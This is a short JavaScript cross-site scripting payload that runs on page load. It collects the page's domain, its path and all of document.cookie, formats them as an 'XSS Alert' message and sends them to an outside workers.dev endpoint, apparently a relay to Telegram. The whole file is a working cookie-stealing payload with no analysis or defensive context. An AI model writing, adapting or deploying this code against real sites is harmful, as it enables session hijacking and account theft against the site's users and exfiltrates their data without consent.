function telegramSend() {
    var textData = 
        'XSS Alert in ' + document.domain + '\n\n' + 
        '------------------------------------------------\n\n' + 
        '<b>- URL Target -</b>\n' +
        '<pre>' + document.location.hostname + document.location.pathname + '</pre>\n\n' +
        '<b>- Document Cookie -</b>\n' +
        '<pre>' + document.cookie + '</pre>';

    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://memek-worker.defoy89122.workers.dev/?message=' + encodeURIComponent(textData), true);
    xhr.send();
}

telegramSend();
